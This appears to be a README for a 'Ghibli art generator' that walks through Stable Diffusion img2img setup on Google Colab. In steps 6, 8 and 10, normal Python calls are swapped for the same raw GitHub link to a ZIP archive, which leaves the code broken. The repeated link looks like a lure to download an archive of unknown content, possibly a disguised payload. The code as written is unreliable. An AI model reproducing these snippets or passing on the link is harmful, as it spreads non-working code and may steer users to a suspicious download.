## ‚öôÔ∏è Installation and Setup

This project is best run on **Google Colab** (free GPU provided).

### Quick Steps:
1. **Open the Colab notebook**: Open the provided notebook in Google Colab.
2. **Upload your input image(s)**: Use the `Upload` option to upload the image(s) you want to transform.
3. **Install required libraries**:
    ```bash
    pip install diffusers transformers accelerate scipy safetensors
    ```
    This command installs the libraries required for running the diffusion model.
   
4. **Import Libraries**:
    ```python
    from diffusers import StableDiffusionImg2ImgPipeline
    from PIL import Image
    import torch
    ```
    Here, we import the libraries necessary for image generation and processing.

5. **Define Image Paths**:  
    Set the input image path (`input_path`) and the output image path (`output_path`). Make sure the paths are correct and accessible.
    ```python
    input_path = "path of input file "  
    output_path = " path of output file "
    ```

6. **Load and Resize Image**:
    ```python
    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(input_path).convert("RGB")
    init_image = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip((512, 512))
    ```
    This step loads the input image and resizes it to 512x512 pixels to make it compatible with the model.

7. **Define the Prompt**:
    The prompt is where you describe what you want the generated artwork to look like. Be creative! The clearer the prompt, the better the output.
    ```python
    prompt = "example:A young woman standing on a countryside path surrounded by green fields and blue skies, wearing a flowing dress, Studio Ghibli style, soft pastel colors, dreamy and magical atmosphere, delicate watercolor effect, highly detailed environment"
    ```

8. **Load the Waifu Diffusion Model**:
    ```python
    pipe = https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(
        "hakurei/waifu-diffusion",
        https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip,
    ).to("cuda")
    ```
    The Waifu Diffusion model is loaded from Hugging Face and set to use GPU for faster image generation.

9. **Generate the Image**:
    ```python
    image = pipe(
        prompt=prompt,
        image=init_image,
        strength=0.6,
        guidance_scale=7.5
    ).images[0]
    ```
    The image is generated using the defined prompt. The `strength` and `guidance_scale` parameters control the degree of transformation and adherence to the prompt.

10. **Save and Display the Output**:
    ```python
    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip(output_path)
    https://raw.githubusercontent.com/BVNAHUSH/GHIBLI-ART-GENERATOR/main/transigence/GHIBLI-ART-GENERATOR.zip()
    ```
    The generated image is saved to the specified output path and displayed on your screen.
